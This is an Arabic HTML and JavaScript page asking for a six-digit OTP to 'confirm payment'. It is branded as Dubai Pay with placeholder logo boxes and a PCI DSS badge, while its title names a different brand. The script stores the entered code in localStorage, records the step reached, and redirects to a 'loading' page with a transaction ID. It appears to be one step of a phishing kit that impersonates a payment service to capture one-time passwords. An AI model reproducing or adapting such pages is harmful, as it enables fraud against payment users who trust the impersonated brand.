<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من OTP - فزعة</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            padding: 20px;
        }

        .header {
            background: white;
            padding: 15px 20px;
            border-radius: 8px;
            margin-bottom: 40px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header-left {
            display: flex;
            gap: 15px;
            align-items: center;
        }

        .header-logo {
            width: 40px;
            height: 40px;
            background: #0066cc;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 12px;
        }

        .header-text h2 {
            color: #1f2937;
            font-size: 16px;
            margin-bottom: 2px;
        }

        .header-text p {
            color: #6b7280;
            font-size: 12px;
        }

        .header-right {
            text-align: center;
        }

        .header-right-logo {
            width: 50px;
            height: 50px;
            background: #00bcd4;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 14px;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .otp-icon {
            width: 280px;
            height: auto;
            margin-bottom: 40px;
            animation: slideDown 0.6s ease-out;
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .form-section {
            background: white;
            border-radius: 12px;
            padding: 40px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
            width: 100%;
            animation: fadeIn 0.8s ease-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        .form-title {
            color: #1f2937;
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 10px;
            text-align: center;
        }

        .form-subtitle {
            color: #6b7280;
            font-size: 14px;
            margin-bottom: 30px;
            text-align: center;
        }

        .form-group {
            margin-bottom: 25px;
        }

        label {
            display: block;
            color: #1f2937;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 12px;
            text-align: center;
        }

        .otp-input-group {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin-bottom: 15px;
        }

        .otp-input {
            width: 50px;
            height: 50px;
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            font-size: 24px;
            text-align: center;
            font-weight: 700;
            color: #0066cc;
            transition: all 0.3s ease;
            background: #f9fafb;
        }

        .otp-input:focus {
            outline: none;
            border-color: #0066cc;
            background: white;
            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1);
        }

        .otp-input:disabled {
            background: #f3f4f6;
            color: #6b7280;
        }

        .timer {
            color: #6b7280;
            font-size: 13px;
            font-weight: 600;
            text-align: center;
            margin-top: 10px;
        }

        .timer.warning {
            color: #f59e0b;
        }

        .timer.danger {
            color: #ef4444;
        }

        .button-group {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-top: 30px;
            margin-bottom: 20px;
        }

        .security-badge {
            display: flex;
            justify-content: center;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e5e7eb;
        }

        .security-badge img {
            height: 40px;
            width: auto;
        }

        .btn {
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-cancel {
            background: #f3f4f6;
            color: #6b7280;
        }

        .btn-cancel:hover {
            background: #e5e7eb;
        }

        .btn-confirm {
            background: #0066cc;
            color: white;
        }

        .btn-confirm:hover:not(:disabled) {
            background: #0052a3;
            box-shadow: 0 4px 12px rgba(0, 102, 204, 0.3);
        }

        .btn-confirm:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .error-message {
            background: #fee2e2;
            color: #991b1b;
            padding: 12px;
            border-radius: 6px;
            font-size: 13px;
            margin-bottom: 20px;
            display: none;
            text-align: center;
        }

        .error-message.show {
            display: block;
            animation: shake 0.5s ease-in-out;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        @media (max-width: 768px) {
            .container {
                max-width: 100%;
            }

            .otp-icon {
                width: 200px;
                margin-bottom: 30px;
            }

            .form-section {
                padding: 30px 20px;
            }

            .form-title {
                font-size: 20px;
            }

            .button-group {
                grid-template-columns: 1fr;
            }

            .otp-input {
                width: 45px;
                height: 45px;
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <div class="header-left">
            <div class="header-logo">DP</div>
            <div class="header-text">
                <h2>سداد دبي</h2>
                <p>Dubai Pay</p>
            </div>
        </div>
        <div class="header-right">
            <div class="header-right-logo">SD</div>
        </div>
    </div>

    <!-- Main Container -->
    <div class="container">
        <!-- OTP Icon -->
        <img src="otp_icon.jpg" alt="OTP" class="otp-icon">

        <!-- Form Section -->
        <div class="form-section">
            <h1 class="form-title">التحقق من الهوية</h1>
            <p class="form-subtitle">أدخل رمز التحقق المرسل إلى جوالك</p>

            <div class="error-message" id="errorMessage"></div>

            <form id="otpForm" onsubmit="submitOTP(event)">
                <div class="form-group">
                    <label>رمز التحقق (OTP)</label>
                    <div class="otp-input-group">
                        <input type="text" class="otp-input" id="otp1" maxlength="1" inputmode="numeric">
                        <input type="text" class="otp-input" id="otp2" maxlength="1" inputmode="numeric">
                        <input type="text" class="otp-input" id="otp3" maxlength="1" inputmode="numeric">
                        <input type="text" class="otp-input" id="otp4" maxlength="1" inputmode="numeric">
                        <input type="text" class="otp-input" id="otp5" maxlength="1" inputmode="numeric">
                        <input type="text" class="otp-input" id="otp6" maxlength="1" inputmode="numeric">
                    </div>
                    <div class="timer" id="timer">الوقت المتبقي: <span id="timeLeft">300</span> ثانية</div>
                </div>

                <div class="button-group">
                    <button type="button" class="btn btn-cancel" onclick="goBack()">إلغاء</button>
                    <button type="submit" class="btn btn-confirm" id="confirmBtn">تأكيد الدفع</button>
                </div>

                <div class="security-badge">
                    <img src="pci_dss_logo.png" alt="PCI DSS">
                </div>
            </form>
        </div>
    </div>

    <script>
        let timeLeft = 300;
        let currentTxnId = null;

        function getQueryParam(name) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(name);
        }

        function setupOtpInputs() {
            const inputs = document.querySelectorAll('.otp-input');
            inputs.forEach((input, index) => {
                input.addEventListener('input', (e) => {
                    if (e.target.value.length === 1) {
                        if (index < inputs.length - 1) {
                            inputs[index + 1].focus();
                        }
                    }
                });

                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && e.target.value === '') {
                        if (index > 0) {
                            inputs[index - 1].focus();
                        }
                    }
                });
            });
        }

        function showError(message) {
            const errorDiv = document.getElementById('errorMessage');
            errorDiv.textContent = message;
            errorDiv.classList.add('show');
            setTimeout(() => {
                errorDiv.classList.remove('show');
            }, 5000);
        }

        function submitOTP(event) {
            event.preventDefault();

            const otp = document.getElementById('otp1').value +
                       document.getElementById('otp2').value +
                       document.getElementById('otp3').value +
                       document.getElementById('otp4').value +
                       document.getElementById('otp5').value +
                       document.getElementById('otp6').value;

            if (!otp || otp.length !== 6) {
                showError('يرجى إدخال رمز التحقق الصحيح');
                return;
            }

            // Save OTP
            localStorage.setItem('otpCode', otp);

            // Update current page
            const formData = JSON.parse(localStorage.getItem('formData') || '{}');
            formData.currentPage = 'payment_otp';
            localStorage.setItem('formData', JSON.stringify(formData));

            // Disable button and show loading
            document.getElementById('confirmBtn').disabled = true;

            // Go to loading page
            window.location.href = 'payment_otp_loading_ar.html?txnId=' + currentTxnId;
        }

        function goBack() {
            window.history.back();
        }

        function startTimer() {
            const timerInterval = setInterval(() => {
                timeLeft--;
                const timerElement = document.getElementById('timer');
                const timeLeftSpan = document.getElementById('timeLeft');

                timeLeftSpan.textContent = timeLeft;

                if (timeLeft <= 60) {
                    timerElement.classList.add('warning');
                } else {
                    timerElement.classList.remove('warning');
                }

                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    document.getElementById('confirmBtn').disabled = true;
                    timerElement.textContent = 'انتهت صلاحية الرمز';
                    timerElement.classList.remove('warning');
                    timerElement.classList.add('danger');
                }
            }, 1000);
        }

        window.addEventListener('load', () => {
            currentTxnId = getQueryParam('txnId');
            setupOtpInputs();
            startTimer();
        });
    </script>
</body>
</html>
